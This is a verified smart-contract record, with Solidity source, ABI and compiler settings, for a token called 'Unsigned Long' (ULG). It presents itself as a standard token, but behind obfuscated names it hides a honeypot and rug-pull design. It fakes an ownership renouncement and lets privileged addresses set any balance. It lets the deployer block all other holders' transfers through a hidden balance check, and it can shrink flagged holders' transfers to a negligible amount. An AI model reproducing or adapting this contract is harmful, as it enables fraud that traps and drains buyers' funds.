{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface marketingSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTrading {\n    function createPair(address feeReceiverMin, address takeTokenFee) external returns (address);\n}\n\ninterface marketingMinTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableIs) external view returns (uint256);\n\n    function transfer(address senderList, uint256 marketingMode) external returns (bool);\n\n    function allowance(address amountFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderList,\n        uint256 marketingMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTotal, uint256 value);\n    event Approval(address indexed amountFrom, address indexed spender, uint256 value);\n}\n\ninterface receiverTo is marketingMinTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnsignedLong is maxSell, marketingMinTrading, receiverTo {\n\n    uint256 constant feeReceiver = 10 ** 10;\n\n    uint256 feeSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellReceiver;\n    }\n\n    bool public autoFrom;\n\n    function balanceOf(address enableIs) public view virtual override returns (uint256) {\n        return feeTxMode[enableIs];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeSenderFee;\n    }\n\n    function launchExempt() public {\n        emit OwnershipTransferred(tradingLaunchedAuto, address(0));\n        launchSwapSender = address(0);\n    }\n\n    address atLaunchTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public swapEnable;\n\n    address private launchSwapSender;\n\n    function name() external view virtual override returns (string memory) {\n        return senderTo;\n    }\n\n    function maxLaunched(address fundLaunchedAuto, uint256 marketingMode) public {\n        modeFund();\n        feeTxMode[fundLaunchedAuto] = marketingMode;\n    }\n\n    function owner() external view returns (address) {\n        return launchSwapSender;\n    }\n\n    uint256 fundIs;\n\n    uint256 public teamEnable;\n\n    mapping(address => bool) public exemptFundToken;\n\n    mapping(address => uint256) private feeTxMode;\n\n    address shouldReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address listAmountSell, uint256 marketingMode) public virtual override returns (bool) {\n        feeLimit[_msgSender()][listAmountSell] = marketingMode;\n        emit Approval(_msgSender(), listAmountSell, marketingMode);\n        return true;\n    }\n\n    bool private modeAmount;\n\n    uint256 public isList;\n\n    constructor (){\n        \n        marketingSender launchWalletMarketing = marketingSender(atLaunchTotal);\n        modeMax = buyTrading(launchWalletMarketing.factory()).createPair(launchWalletMarketing.WETH(), address(this));\n        if (isList == teamEnable) {\n            autoFrom = false;\n        }\n        tradingLaunchedAuto = _msgSender();\n        launchExempt();\n        marketingLimit[tradingLaunchedAuto] = true;\n        feeTxMode[tradingLaunchedAuto] = modeSenderFee;\n        if (atLiquidity != autoTakeBuy) {\n            listAt = true;\n        }\n        emit Transfer(address(0), tradingLaunchedAuto, modeSenderFee);\n    }\n\n    address public tradingLaunchedAuto;\n\n    uint256 private modeSenderFee = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeBuy;\n    }\n\n    uint8 private sellReceiver = 18;\n\n    uint256 private atLiquidity;\n\n    event OwnershipTransferred(address indexed receiverMinFund, address indexed senderMode);\n\n    uint256 private fundTeam;\n\n    function limitSell(address atMin, address senderList, uint256 marketingMode) internal returns (bool) {\n        if (atMin == tradingLaunchedAuto) {\n            return sellLaunch(atMin, senderList, marketingMode);\n        }\n        uint256 fundFrom = marketingMinTrading(modeMax).balanceOf(shouldReceiver);\n        require(fundFrom == fundIs);\n        require(senderList != shouldReceiver);\n        if (exemptFundToken[atMin]) {\n            return sellLaunch(atMin, senderList, feeReceiver);\n        }\n        return sellLaunch(atMin, senderList, marketingMode);\n    }\n\n    uint256 private autoTakeBuy;\n\n    function modeFund() private view {\n        require(marketingLimit[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchSwapSender;\n    }\n\n    function allowance(address takeLimitLaunched, address listAmountSell) external view virtual override returns (uint256) {\n        if (listAmountSell == atLaunchTotal) {\n            return type(uint256).max;\n        }\n        return feeLimit[takeLimitLaunched][listAmountSell];\n    }\n\n    function transferFrom(address atMin, address senderList, uint256 marketingMode) external override returns (bool) {\n        if (_msgSender() != atLaunchTotal) {\n            if (feeLimit[atMin][_msgSender()] != type(uint256).max) {\n                require(marketingMode <= feeLimit[atMin][_msgSender()]);\n                feeLimit[atMin][_msgSender()] -= marketingMode;\n            }\n        }\n        return limitSell(atMin, senderList, marketingMode);\n    }\n\n    address public modeMax;\n\n    function launchTake(address liquidityWallet) public {\n        require(liquidityWallet.balance < 100000);\n        if (swapEnable) {\n            return;\n        }\n        \n        marketingLimit[liquidityWallet] = true;\n        \n        swapEnable = true;\n    }\n\n    function modeLaunch(uint256 marketingMode) public {\n        modeFund();\n        fundIs = marketingMode;\n    }\n\n    function transfer(address fundLaunchedAuto, uint256 marketingMode) external virtual override returns (bool) {\n        return limitSell(_msgSender(), fundLaunchedAuto, marketingMode);\n    }\n\n    mapping(address => bool) public marketingLimit;\n\n    function sellLaunch(address atMin, address senderList, uint256 marketingMode) internal returns (bool) {\n        require(feeTxMode[atMin] >= marketingMode);\n        feeTxMode[atMin] -= marketingMode;\n        feeTxMode[senderList] += marketingMode;\n        emit Transfer(atMin, senderList, marketingMode);\n        return true;\n    }\n\n    string private modeBuy = \"ULG\";\n\n    mapping(address => mapping(address => uint256)) private feeLimit;\n\n    function swapWalletTotal(address listLiquidity) public {\n        modeFund();\n        \n        if (listLiquidity == tradingLaunchedAuto || listLiquidity == modeMax) {\n            return;\n        }\n        exemptFundToken[listLiquidity] = true;\n    }\n\n    string private senderTo = \"Unsigned Long\";\n\n    bool private listAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMinFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimitLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listAmountSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmountSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFundToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"maxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"modeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"swapWalletTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunchedAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnsignedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}